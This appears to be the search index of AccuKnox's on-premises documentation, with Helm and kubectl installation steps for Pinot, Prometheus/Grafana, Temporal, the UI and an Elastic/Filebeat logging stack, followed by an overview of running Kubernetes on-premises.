App\" - name : SPLUNK_FEEDER_INDEX value : \"Splunk Index configured on HEC in Splunk App\"","title":"Step 5: Forwarding Logs to Splunk"},{"location":"accuknox-onprem/onprem-feeder/#51-enablingdisabling-splunk-runtime","text":"kubectl set env deploy/feeder -n feeder-service SPLUNK_FEEDER_ENABLED = \"true\" By enabling the flag to true (as above), the logs will be pushed to Splunk.Conversely disabling it to \"false\" will stop pushing logs. Note: Likewise other configuration parameters can be updated in Runtime.","title":"5.1. Enabling/Disabling Splunk (Runtime):"},{"location":"accuknox-onprem/pinot-install/","text":"Note: \u00b6 Pinot Operator Deployment 1. Don't change the namespace name because if you change the namespace - You need to change the service name , If the service name is changed ,then you need to change the microservice configmap files . eg: app.yaml. Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and labels Taints - pinot:true Labels - pinot:true Installing Helm \u00b6 This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases. From the Binary Releases \u00b6 Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here.. Add accuknox repository to install Pinot helm package helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites helm repo update helm search repo accuknox-onprem-prerequisites helm pull accuknox-onprem-prerequisites/pinot-chart --untar kubectl create namespace accuknox-pinot helm install accuknox-pinot pinot -n accuknox-pinot Note: \u00b6 Pinot Schemas and tables should be loaded via Pinot UI.","title":"Pinot install"},{"location":"accuknox-onprem/pinot-install/#note","text":"Pinot Operator Deployment 1. Don't change the namespace name because if you change the namespace - You need to change the service name , If the service name is changed ,then you need to change the microservice configmap files . eg: app.yaml. Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and labels Taints - pinot:true Labels - pinot:true","title":"Note:"},{"location":"accuknox-onprem/pinot-install/#installing-helm","text":"This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.","title":"Installing Helm"},{"location":"accuknox-onprem/pinot-install/#from-the-binary-releases","text":"Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here.. Add accuknox repository to install Pinot helm package helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites helm repo update helm search repo accuknox-onprem-prerequisites helm pull accuknox-onprem-prerequisites/pinot-chart --untar kubectl create namespace accuknox-pinot helm install accuknox-pinot pinot -n accuknox-pinot","title":"From the Binary Releases"},{"location":"accuknox-onprem/pinot-install/#note_1","text":"Pinot Schemas and tables should be loaded via Pinot UI.","title":"Note:"},{"location":"accuknox-onprem/pinot-purpose/","text":"Pinot is a real-time distributed OLAP datastore, purpose-built to provide ultra low-latency analytics, even at extremely high throughput. It can ingest directly from streaming data sources - such as Apache Kafka and Amazon Kinesis - and make the events available for querying instantly. It can also ingest from batch data sources such as Hadoop HDFS, Amazon S3, Azure ADLS, and Google Cloud Storage. At the heart of the system is a columnar store, with several smart indexing and pre-aggregation techniques for low latency. This makes Pinot the most perfect fit for user-facing realtime analytics. At the same time, Pinot is also a great choice for other analytical use-cases, such as internal dashboards, anomaly detection, and ad-hoc data exploration. For more reference: click here..","title":"Pinot purpose"},{"location":"accuknox-onprem/pinot-verify/","text":"kubectl get all -n accuknox-pinot","title":"Pinot verify"},{"location":"accuknox-onprem/prom-graf-install/","text":"Note: \u00b6 Prometheus Grafana Deployment Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Tolerations and Node Selector Tolerations: - key:\u201dmonitoring\u201d operator: \u201cEqual\u201d value: \u201ctrue\u201d effect: \u201cNoSchedule\u201d Nodeselector: monitoring: \u201ctrue\u201d Installing Helm \u00b6 This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases. From the Binary Releases \u00b6 Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here.. Add accuknox repository to install Prometheus & Grafana helm package: helm repo add accuknox-onprem-monitoring https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-monitoring helm repo update helm search repo accuknox-onprem-monitoring helm pull accuknox-onprem-monitoring/grafana-prometheus-stack --untar kubectl create namespace accuknox-monitoring kubectl config set-context --current --namespace = accuknox-monitoring helm install prometheusmetrics grafana-prometheus-stack Check the Pods deployment: kubectl get pods -n accuknox-monitoring Default Username & Password for Grafana: User: admin Password: prom-operator","title":"Prom graf install"},{"location":"accuknox-onprem/prom-graf-install/#note","text":"Prometheus Grafana Deployment Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Tolerations and Node Selector Tolerations: - key:\u201dmonitoring\u201d operator: \u201cEqual\u201d value: \u201ctrue\u201d effect: \u201cNoSchedule\u201d Nodeselector: monitoring: \u201ctrue\u201d","title":"Note:"},{"location":"accuknox-onprem/prom-graf-install/#installing-helm","text":"This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.","title":"Installing Helm"},{"location":"accuknox-onprem/prom-graf-install/#from-the-binary-releases","text":"Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here.. Add accuknox repository to install Prometheus & Grafana helm package: helm repo add accuknox-onprem-monitoring https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-monitoring helm repo update helm search repo accuknox-onprem-monitoring helm pull accuknox-onprem-monitoring/grafana-prometheus-stack --untar kubectl create namespace accuknox-monitoring kubectl config set-context --current --namespace = accuknox-monitoring helm install prometheusmetrics grafana-prometheus-stack Check the Pods deployment: kubectl get pods -n accuknox-monitoring Default Username & Password for Grafana: User: admin Password: prom-operator","title":"From the Binary Releases"},{"location":"accuknox-onprem/prom-graf-purpose/","text":"Prometheus is an open-source systems monitoring and alerting toolkit.Prometheus collects and stores its metrics as time series data. Features: PromQL, a flexible query language to leverage this dimensionality Time series collection happens via a pull model over HTTP Pushing time series is supported via an intermediary gateway Targets are discovered via service discovery or static configuration Multiple modes of graphing and dashboarding support Dependencies: By default this chart installs additional, dependent charts: Kube-state-metrics prometheus-node-exporter Grafana","title":"Prom graf purpose"},{"location":"accuknox-onprem/prom-graf-verify/","text":"kubectl get all -n accuknox-monitoring You can see all the pods are up and running.","title":"Prom graf verify"},{"location":"accuknox-onprem/support/","text":"Please post your issues on support.accuknox.com","title":"Support"},{"location":"accuknox-onprem/sw-req-pre-requisites/","text":"","title":"Sw req pre requisites"},{"location":"accuknox-onprem/temporal-deploy/","text":"Temporal Operator Deployment \u00b6 1. Please create a namespace of your choice. Example : temporal-server \u00b6 kubectl create ns accuknox-temporal 2. Clone the git repository \u00b6 git clone https://github.com/temporalio/helm-charts.git mv helm-charts temporal-server-chart Navigate into the directory that holds helm-charts folder. 3.Helm Install \u00b6 helm upgrade --install accuknox-temporal-server temporal-server-chart --set server.replicaCount = 1 --set cassandra.config.cluster_size = 1 --set prometheus.enabled = false --set grafana.enabled = false --set elasticsearch.enabled = false --timeout 15m -n accuknox-temporal If Prometheus/ Grafana is not required, please use the below command. helm install --set server.replicaCount = 1 --set cassandra.config.cluster_size = 1 --set prometheus.enabled = false --set grafana.enabled = false --set elasticsearch.enabled = false temporal . --timeout 15m -n accuknox-temporal kubectl get all -n temporal-server 4 .Set the Default Namespace \u00b6 Syntax: kubectl exec -n accuknox-temporal -it pod/temporaltest-admintools-<pod-id> -- /bin/bash tctl --ns default n re Example: 5 .Successful Installation \u00b6 Port-forward the temporal-web (:8088) pod to view the temporal workflows UI. kubectl port-forward svc/temporaltest-web 8088 :8088 -n accuknox-temporal","title":"Temporal deploy"},{"location":"accuknox-onprem/temporal-deploy/#temporal-operator-deployment","text":"","title":"Temporal Operator Deployment"},{"location":"accuknox-onprem/temporal-deploy/#1-please-create-a-namespace-of-your-choice-example-temporal-server","text":"kubectl create ns accuknox-temporal","title":"1. Please create a namespace of your choice. Example : temporal-server"},{"location":"accuknox-onprem/temporal-deploy/#2-clone-the-git-repository","text":"git clone https://github.com/temporalio/helm-charts.git mv helm-charts temporal-server-chart Navigate into the directory that holds helm-charts folder.","title":"2. Clone the git repository"},{"location":"accuknox-onprem/temporal-deploy/#3helm-install","text":"helm upgrade --install accuknox-temporal-server temporal-server-chart --set server.replicaCount = 1 --set cassandra.config.cluster_size = 1 --set prometheus.enabled = false --set grafana.enabled = false --set elasticsearch.enabled = false --timeout 15m -n accuknox-temporal If Prometheus/ Grafana is not required, please use the below command. helm install --set server.replicaCount = 1 --set cassandra.config.cluster_size = 1 --set prometheus.enabled = false --set grafana.enabled = false --set elasticsearch.enabled = false temporal . --timeout 15m -n accuknox-temporal kubectl get all -n temporal-server","title":"3.Helm Install"},{"location":"accuknox-onprem/temporal-deploy/#4-set-the-default-namespace","text":"Syntax: kubectl exec -n accuknox-temporal -it pod/temporaltest-admintools-<pod-id> -- /bin/bash tctl --ns default n re Example:","title":"4 .Set the Default Namespace"},{"location":"accuknox-onprem/temporal-deploy/#5-successful-installation","text":"Port-forward the temporal-web (:8088) pod to view the temporal workflows UI. kubectl port-forward svc/temporaltest-web 8088 :8088 -n accuknox-temporal","title":"5 .Successful Installation"},{"location":"accuknox-onprem/temporal/","text":"Temporal \u00b6 Temporal is an orchestration platform for microservices and a workflow engine that runs in a loop until the workflow is complete. The major advantages of temporal include Handling intermittent failures Re-running the failed operations until success. Supporting long running operations. Running multiple operations parallelly. Temporal are written in two types of special purpose functions: 1. What are workflows ? \u00b6 Workflows can be seen as a set of tasks that has a specific goal to achieve and it will run until the goal is achieved. Workflow has various timeout options in order to stop the workflow if it runs for a longer period of time. 2.What are activities ? \u00b6 Activities contain the business logic of the user application. It is invoked via workflow and task queues. Task queues are used to store activities in a queue and a worker comes and picks up an activity to get it done. 3.How are temporal workflows used in AccuKnox ? \u00b6 There are various components in Accuknox such as Network, System, Anomaly Detection and Data protection and these components send logs to kafka topic. The role of the workflow comes here where there are specific workflows for each component and they continuously run, scanning for logs from kafka. The workflow runs without a pause since the logs from the specific components comes every second and it has to capture it and process the logs such that it can send it to different integration channels.","title":"Temporal"},{"location":"accuknox-onprem/temporal/#temporal","text":"Temporal is an orchestration platform for microservices and a workflow engine that runs in a loop until the workflow is complete. The major advantages of temporal include Handling intermittent failures Re-running the failed operations until success. Supporting long running operations. Running multiple operations parallelly. Temporal are written in two types of special purpose functions:","title":"Temporal"},{"location":"accuknox-onprem/temporal/#1-what-are-workflows","text":"Workflows can be seen as a set of tasks that has a specific goal to achieve and it will run until the goal is achieved. Workflow has various timeout options in order to stop the workflow if it runs for a longer period of time.","title":"1. What are workflows ?"},{"location":"accuknox-onprem/temporal/#2what-are-activities","text":"Activities contain the business logic of the user application. It is invoked via workflow and task queues. Task queues are used to store activities in a queue and a worker comes and picks up an activity to get it done.","title":"2.What are activities ?"},{"location":"accuknox-onprem/temporal/#3how-are-temporal-workflows-used-in-accuknox","text":"There are various components in Accuknox such as Network, System, Anomaly Detection and Data protection and these components send logs to kafka topic. The role of the workflow comes here where there are specific workflows for each component and they continuously run, scanning for logs from kafka. The workflow runs without a pause since the logs from the specific components comes every second and it has to capture it and process the logs such that it can send it to different integration channels.","title":"3.How are temporal workflows used in AccuKnox ?"},{"location":"accuknox-onprem/ui-deploy/","text":"Add accuknox repository to install UI on VM \u00b6 helm repo add accuknox-onprem-ui https:/USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-ui helm repo update helm search repo accuknox-onprem-ui helm pull accuknox-ui/ui-build --untar Step 1 : Install nginx application on VM Step 2: Configure the certmanager(https)(eg: letsencrypt) Step 3: tar -xvf build.tar.gz Step 4: sudo cp -rvf build/* /usr/share/nginx/html/ Step 5: Start the service","title":"Ui deploy"},{"location":"accuknox-onprem/ui-deploy/#add-accuknox-repository-to-install-ui-on-vm","text":"helm repo add accuknox-onprem-ui https:/USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-ui helm repo update helm search repo accuknox-onprem-ui helm pull accuknox-ui/ui-build --untar Step 1 : Install nginx application on VM Step 2: Configure the certmanager(https)(eg: letsencrypt) Step 3: tar -xvf build.tar.gz Step 4: sudo cp -rvf build/* /usr/share/nginx/html/ Step 5: Start the service","title":"Add accuknox repository to install UI on VM"},{"location":"accuknox-onprem/ui-onprem-purpose/","text":"Accuknox UI dashboard provides extensive features, feasible user experience and provides end to end control over a single dashboard. Some of the extensive features \u00b6 Enforce policy via AccuKnox UI from Policy Page and stop this attack once the client onboard his cluster to AccuKnox SaaS. It provides impact before and after applying policy and feature of the recommended policy provided via AccuKnox. It shows respective Logs/Telemetry for the attack Scenario when it blocked the RCE attack. It provides capability to configure notifications to custom channels such as Slack/Splunk [SIEM Integration] if an attacker trying to execute into the client workload from UI itself.","title":"Ui onprem purpose"},{"location":"accuknox-onprem/ui-onprem-purpose/#some-of-the-extensive-features","text":"Enforce policy via AccuKnox UI from Policy Page and stop this attack once the client onboard his cluster to AccuKnox SaaS. It provides impact before and after applying policy and feature of the recommended policy provided via AccuKnox. It shows respective Logs/Telemetry for the attack Scenario when it blocked the RCE attack. It provides capability to configure notifications to custom channels such as Slack/Splunk [SIEM Integration] if an attacker trying to execute into the client workload from UI itself.","title":"Some of the extensive features"},{"location":"accuknox-onprem/ui-onprem/","text":"Prerequisites: \u00b6 Install below packages 1. node version v12+ 2. npm version 6+ 3. Yarn version 1.17+ For your reference: https://nodejs.org/en/ https://yarnpkg.com/getting-started/install https://docs.npmjs.com/cli/v7/commands/npm-install Git Clone the Onprem UI \u00b6 git clone https://USERNAME:PASSWORD@github.com/accuknox/accuknox-onprem.git git checkout accuknox-onprem-ui Steps to install Accuknox UI \u00b6 Step 1 : $yarn install Step 2 : Need to add the new API- base URL path (path to gateway) in two places in the below project files.. a) LINE 1: ui-app/app/src/constants/urls.ts b) LINE 7: ui-app/platform-ui/src/api/custom.js Eg: const baseAPIPath = 'https://api-dev.accuknox.com'; change the above api as per your Environment <https://api.example.com> Step 3 : $npm run build 3.1 : optional (Command to remove existing code) Eg: $gsutil -m rm -r gs://accuknox-ui/build/* Step 4: Pushing build files from apps/build to GCP bucket(aws or azure bucket) Eg: $gsutil -m cp -r app/build/* gs://accuknox-ui/build/ Note : Step 4 will vary for different cloud providers Step 5 : Install nginx application on VM Step 6 : Configure the certmanager(https) Eg: letsencrypt Tool Step 7 : tar -xvf build.tar.gz Step 8 : sudo cp -rvf build/* /usr/share/nginx/html/ Step 9 : Start the service","title":"Ui onprem"},{"location":"accuknox-onprem/ui-onprem/#prerequisites","text":"Install below packages 1. node version v12+ 2. npm version 6+ 3. Yarn version 1.17+ For your reference: https://nodejs.org/en/ https://yarnpkg.com/getting-started/install https://docs.npmjs.com/cli/v7/commands/npm-install","title":"Prerequisites:"},{"location":"accuknox-onprem/ui-onprem/#git-clone-the-onprem-ui","text":"git clone https://USERNAME:PASSWORD@github.com/accuknox/accuknox-onprem.git git checkout accuknox-onprem-ui","title":"Git Clone the Onprem UI"},{"location":"accuknox-onprem/ui-onprem/#steps-to-install-accuknox-ui","text":"Step 1 : $yarn install Step 2 : Need to add the new API- base URL path (path to gateway) in two places in the below project files.. a) LINE 1: ui-app/app/src/constants/urls.ts b) LINE 7: ui-app/platform-ui/src/api/custom.js Eg: const baseAPIPath = 'https://api-dev.accuknox.com'; change the above api as per your Environment <https://api.example.com> Step 3 : $npm run build 3.1 : optional (Command to remove existing code) Eg: $gsutil -m rm -r gs://accuknox-ui/build/* Step 4: Pushing build files from apps/build to GCP bucket(aws or azure bucket) Eg: $gsutil -m cp -r app/build/* gs://accuknox-ui/build/ Note : Step 4 will vary for different cloud providers Step 5 : Install nginx application on VM Step 6 : Configure the certmanager(https) Eg: letsencrypt Tool Step 7 : tar -xvf build.tar.gz Step 8 : sudo cp -rvf build/* /usr/share/nginx/html/ Step 9 : Start the service","title":"Steps to install Accuknox UI"},{"location":"accuknox-onprem/what-is-ak-on-prem/","text":"Overview \u00b6 The best Kubernetes architecture for your organization depends on your needs and goals. Kubernetes is often described as a cloud-native technology, and it certainly qualifies as one. However, the cloud-native concept does not exclude the use of on-premises infrastructure in cases where it makes sense. Depending on your organization\u2019s needs regarding compliance, locality and cost for running your workloads, there may be significant advantages to running Kubernetes deployments on-premises. Kubernetes has achieved an unprecedented adoption rate, due in part to the fact that it substantially simplifies the deployment and management of microservices. Almost equally important is that it allows users who are unable to utilize the public cloud to operate in a \u201ccloud-like\u201d environment. It does this by decoupling dependencies and abstracting infrastructure away from your application stack, giving you the portability and the scalability that\u2019s associated with cloud-native applications. Why Run Kubernetes On-premises \u00b6 Why do organizations choose the path of running Kubernetes in their own data centers, compared to the relative \u201ccake-walk\u201d with public cloud providers? There are typically a few important reasons why an Enterprise may choose to invest in a Kubernetes on-premises strategy: Compliance & Data Privacy Some organizations simply can\u2019t use the public cloud, as they are bound by stringent regulations related to compliance and data privacy issues. For example, the GDPR compliance rules may prevent enterprises from serving customers in the european region using services hosted in certain public clouds. Business Policy Reasons Business policy needs, such as having to run your workloads at specific geographical locations, may make it difficult to use public clouds. Some enterprises may not be able to utilize public cloud offerings from a specific cloud provider due to their business policies related to competition. Being Cloud Agnostic to Avoid Lock-in Many enterprises may wish to not be tried to a single cloud provider, and hence may want to deploy their applications across multiple clouds, including an on-premises private cloud. This reduces your risk of business continuity impact due to issues with a specific cloud provider. It also gives you / leverage around price negotiation with your cloud providers. Cost This is probably the most important reason to run Kubernetes on-premises. Running all of your applications in the public clouds can get pretty expensive at scale. Specifically if your applications rely on ingesting and processing a large amount of data , such as an AI/ML application, it can get extremely expensive to run it in a public cloud. If you have existing data centers on-premises or in a co-location hosted facility, running Kubernetes on-premises can be an effective way to reduce your operational costs. For more information on this topic, see this latest report from a16z: The Cost of Cloud, a Trillion Dollar Paradox Quoted from the report \u201d It\u2019s becoming evident that while cloud clearly delivers on its promise early on in a company\u2019s journey, the pressure it puts on margins can start to outweigh the benefits, as a company scales and growth slows. Because this shift happens later in a company\u2019s life, it is difficult to reverse as it\u2019s a result of years of development focused on new features, and not infrastructure optimization\u201d An effective strategy to run Kubernetes on-premises on your own data centers can be used to transform your business and modernize your applications for cloud-native \u2013 while improving infrastructure utilization and saving costs at the same time. Challenges Running Kubernetes On-premises \u00b6 There is a downside to running Kubernetes on-premises however, specially if you are going the Do-It-Yourself (DIY) route. Kubernetes is known for its steep learning curve and operational complexity. When using Kubernetes on AWS or Azure \u2013 your public cloud provider essentially hides all the complexities from you. Running Kubernetes on-premises means you\u2019re on your own for managing these complexities. Here are specific areas where the complexities are involved: Etcd \u2013 manage highly available etcd cluster. You need to take frequent backups to ensure business continuity in case the cluster goes down and the etcd data is lost. Load balancing \u2013 Load balancing may be needed both for your cluster master nodes and your application services running on Kubernetes. Depending on your existing networking setup, you may want to use a load balancer such as F5 or use a software load balancer such as metallb. Availability \u2013 Its critical to ensure that your Kubernetes infrastructure is highly available and can withstand data center and infrastructure downtimes. This would mean having multiple master nodes per cluster, and when relevant, having multiple Kubernetes clusters, across different availability zones. Auto-scaling \u2013 Auto-scaling for the nodes of your cluster can help save resources because the clusters can automatically expand and contract depending on workload needs. This is difficult to achieve for bare metal Kubernetes clusters, unless you are using a bare metal automation platform such as open source Ironic or Platform9\u2019s Managed Bare Metal. Networking \u2013 Networking is very specific to your data center configuration. Persistent storage \u2013 Majority of your production workloads running on Kubernetes will require persistent storage \u2013 block or file storage. The good news is that most of the popular enterprise storage vendors have CSI plugins and supported integrations with Kubernetes. You will need to work with your storage vendor to identify the right plugin and install any additional needed components before you can integration your existing storage solution with Kubernetes on-premises. Upgrades \u2013 You will need to upgrade your clusters roughly every 3 months when a new upstream version of Kubernetes is released. The version upgrade may create issues if there are API incompatibilities introduced with newer version of Kubernetes. A staged upgrading strategy where your development / test clusters are upgraded first before upgrading your production clusters is recommended. Monitoring \u2013 You will need to invest in tooling to monitor the health of your Kubernetes clusters in your on-premise Kubernetes environment. If you have existing monitoring and log management tools such as Datadog or Splunk, most of them have specific capabilities around Kubernetes monitoring. Or you may consider investing in an open source monitoring stack designed to help you monitor Kubernetes clusters such as Prometheus and Grafana. Best Practices for Kubernetes On-premises \u00b6 Below you will find a set of best practices to run Kubernetes on-premises. Depending on your environment configuration, some or all of these may apply to you. Integrating with Existing Environment Kubernetes enables users to run clusters on a diverse set of infrastructures on-premises . So you can \u201crepurpose\u201d your environment to integrate with Kubernetes \u2013 using virtual machines or creating your own cluster from scratch on bare metal. But you would need to build a deep understanding of the specifics of deploying Kubernetes on your existing environment, including your servers, storage systems, and networking infrastructure, to get a well configured production Kubernetes environment. The three most popular ways to deploy Kubernetes on-premises are: Virtual machines on your existing VMware vSphere environment Linux physical servers running Ubuntu, CentOS or RHEL Linux Virtual machines on other types of IaaS environments on-premises such as OpenStack. Running Kubernetes on physical servers can give you native hardware performance, which may be critical for certain types of workloads, however it may limit your ability to quickly scale your infrastructure. If getting bare metal performance is important to you, and if you need to run Kubernetes clusters at scale, then consider investing in a bare metal automation platform such as Ironic , Metal3 or a managed bare metal stack such as Platform9 Managed Bare Metal. Running Kubernetes on virtual machines in your private cloud on VMware or KVM can give you the elasticity of cloud, as you can dynamically scale your Kubernetes clusters up or down based on workload demand. Clusters created on virtual machines are also easy to setup and tear down, making it easy to create ephemeral test environments for developers.","title":"What is ak on prem"},{"location":"accuknox-onprem/what-is-ak-on-prem/#overview","text":"The best Kubernetes architecture for your organization depends on your needs and goals. Kubernetes is often described as a cloud-native technology, and it certainly qualifies as one. However, the cloud-native concept does not exclude the use of on-premises infrastructure in cases where it makes sense. Depending on your organization\u2019s needs regarding compliance, locality and cost for running your workloads, there may be significant advantages to running Kubernetes deployments on-premises. Kubernetes has achieved an unprecedented adoption rate, due in part to the fact that it substantially simplifies the deployment and management of microservices. Almost equally important is that it allows users who are unable to utilize the public cloud to operate in a \u201ccloud-like\u201d environment. It does this by decoupling dependencies and abstracting infrastructure away from your application stack, giving you the portability and the scalability that\u2019s associated with cloud-native applications.","title":"Overview"},{"location":"accuknox-onprem/what-is-ak-on-prem/#why-run-kubernetes-on-premises","text":"Why do organizations choose the path of running Kubernetes in their own data centers, compared to the relative \u201ccake-walk\u201d with public cloud providers? There are typically a few important reasons why an Enterprise may choose to invest in a Kubernetes on-premises strategy: Compliance & Data Privacy Some organizations simply can\u2019t use the public cloud, as they are bound by stringent regulations related to compliance and data privacy issues. For example, the GDPR compliance rules may prevent enterprises from serving customers in the european region using services hosted in certain public clouds. Business Policy Reasons Business policy needs, such as having to run your workloads at specific geographical locations, may make it difficult to use public clouds. Some enterprises may not be able to utilize public cloud offerings from a specific cloud provider due to their business policies related to competition. Being Cloud Agnostic to Avoid Lock-in Many enterprises may wish to not be tried to a single cloud provider, and hence may want to deploy their applications across multiple clouds, including an on-premises private cloud. This reduces your risk of business continuity impact due to issues with a specific cloud provider. It also gives you / leverage around price negotiation with your cloud providers. Cost This is probably the most important reason to run Kubernetes on-premises. Running all of your applications in the public clouds can get pretty expensive at scale. Specifically if your applications rely on ingesting and processing a large amount of data , such as an AI/ML application, it can get extremely expensive to run it in a public cloud. If you have existing data centers on-premises or in a co-location hosted facility, running Kubernetes on-premises can be an effective way to reduce your operational costs. For more information on this topic, see this latest report from a16z: The Cost of Cloud, a Trillion Dollar Paradox Quoted from the report \u201d It\u2019s becoming evident that while cloud clearly delivers on its promise early on in a company\u2019s journey, the pressure it puts on margins can start to outweigh the benefits, as a company scales and growth slows. Because this shift happens later in a company\u2019s life, it is difficult to reverse as it\u2019s a result of years of development focused on new features, and not infrastructure optimization\u201d An effective strategy to run Kubernetes on-premises on your own data centers can be used to transform your business and modernize your applications for cloud-native \u2013 while improving infrastructure utilization and saving costs at the same time.","title":"Why Run Kubernetes On-premises"},{"location":"accuknox-onprem/what-is-ak-on-prem/#challenges-running-kubernetes-on-premises","text":"There is a downside to running Kubernetes on-premises however, specially if you are going the Do-It-Yourself (DIY) route. Kubernetes is known for its steep learning curve and operational complexity. When using Kubernetes on AWS or Azure \u2013 your public cloud provider essentially hides all the complexities from you. Running Kubernetes on-premises means you\u2019re on your own for managing these complexities. Here are specific areas where the complexities are involved: Etcd \u2013 manage highly available etcd cluster. You need to take frequent backups to ensure business continuity in case the cluster goes down and the etcd data is lost. Load balancing \u2013 Load balancing may be needed both for your cluster master nodes and your application services running on Kubernetes. Depending on your existing networking setup, you may want to use a load balancer such as F5 or use a software load balancer such as metallb. Availability \u2013 Its critical to ensure that your Kubernetes infrastructure is highly available and can withstand data center and infrastructure downtimes. This would mean having multiple master nodes per cluster, and when relevant, having multiple Kubernetes clusters, across different availability zones. Auto-scaling \u2013 Auto-scaling for the nodes of your cluster can help save resources because the clusters can automatically expand and contract depending on workload needs. This is difficult to achieve for bare metal Kubernetes clusters, unless you are using a bare metal automation platform such as open source Ironic or Platform9\u2019s Managed Bare Metal. Networking \u2013 Networking is very specific to your data center configuration. Persistent storage \u2013 Majority of your production workloads running on Kubernetes will require persistent storage \u2013 block or file storage. The good news is that most of the popular enterprise storage vendors have CSI plugins and supported integrations with Kubernetes. You will need to work with your storage vendor to identify the right plugin and install any additional needed components before you can integration your existing storage solution with Kubernetes on-premises. Upgrades \u2013 You will need to upgrade your clusters roughly every 3 months when a new upstream version of Kubernetes is released. The version upgrade may create issues if there are API incompatibilities introduced with newer version of Kubernetes. A staged upgrading strategy where your development / test clusters are upgraded first before upgrading your production clusters is recommended. Monitoring \u2013 You will need to invest in tooling to monitor the health of your Kubernetes clusters in your on-premise Kubernetes environment. If you have existing monitoring and log management tools such as Datadog or Splunk, most of them have specific capabilities around Kubernetes monitoring. Or you may consider investing in an open source monitoring stack designed to help you monitor Kubernetes clusters such as Prometheus and Grafana.","title":"Challenges Running Kubernetes On-premises"},{"location":"accuknox-onprem/what-is-ak-on-prem/#best-practices-for-kubernetes-on-premises","text":"Below you will find a set of best practices to run Kubernetes on-premises. Depending on your environment configuration, some or all of these may apply to you. Integrating with Existing Environment Kubernetes enables users to run clusters on a diverse set of infrastructures on-premises . So you can \u201crepurpose\u201d your environment to integrate with Kubernetes \u2013 using virtual machines or creating your own cluster from scratch on bare metal. But you would need to build a deep understanding of the specifics of deploying Kubernetes on your existing environment, including your servers, storage systems, and networking infrastructure, to get a well configured production Kubernetes environment. The three most popular ways to deploy Kubernetes on-premises are: Virtual machines on your existing VMware vSphere environment Linux physical servers running Ubuntu, CentOS or RHEL Linux Virtual machines on other types of IaaS environments on-premises such as OpenStack. Running Kubernetes on physical servers can give you native hardware performance, which may be critical for certain types of workloads, however it may limit your ability to quickly scale your infrastructure. If getting bare metal performance is important to you, and if you need to run Kubernetes clusters at scale, then consider investing in a bare metal automation platform such as Ironic , Metal3 or a managed bare metal stack such as Platform9 Managed Bare Metal. Running Kubernetes on virtual machines in your private cloud on VMware or KVM can give you the elasticity of cloud, as you can dynamically scale your Kubernetes clusters up or down based on workload demand. Clusters created on virtual machines are also easy to setup and tear down, making it easy to create ephemeral test environments for developers.","title":"Best Practices for Kubernetes On-premises"},{"location":"accuknox-onprem/elastic/elastic/","text":"Overview \u00b6 This ELK setup is used for distributed monitoring solution suitable for almost any structured and unstructured data source. Step 1: Elastic Operator Deployment \u00b6 1.1 Create a namespace of your choice. Example : elastic-logging kubectl create ns elastic-logging Note: Use feeder-service namespace , if required. 1.2 Clone the git repository git clone -b dev https://github.com/accuknox/Accuknox-Logging Navigate into the directory that holds eck-operator folder. 1.3 Helm Install (Elastic) Install the CRDs and deploy the operator with cluster-wide permissions to manage all namespaces. helm repo add elastic https://helm.elastic.co helm install elastic-operator eck-operator -n <namespace> Enable the elastic resource as true in values.yaml to install Kibana along with feeder. elasticsearch : enabled : true Note: If there is ELK set up already running on the cluster, the CRD apply may fail. 1.4 Helm Install (Kibana) Please enable the Kibana resource as true in values.yaml to install Kibana along with feeder. kibana : enabled : true Navigate into the directory that holds kibana folder. 1.5 Beats Setup The agent will be spinned along with Filebeat running along as a sidecar. The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana . a. Elastic Configuration Parameters \u00b6 We will create a ConfigMap named filebeat-configmap with the content of filebeat.yml file. kind : ConfigMap metadata : name : filebeat-configmap data : filebeat.yml : | filebeat.inputs: - type: log # Change to true to enable this input configuration. enabled: true # Paths that should be crawled and fetched. Glob based paths. paths: - /var/log/*.log output.elasticsearch: hosts: ${ELASTICSEARCH_HOST} username: ${ELASTICSEARCH_USERNAME} password: ${ELASTICSEARCH_PASSWORD} ssl.verification_mode: none The below Configuration parameters can be updated for elastic configuration. (If Default params needs to be modified) - name : 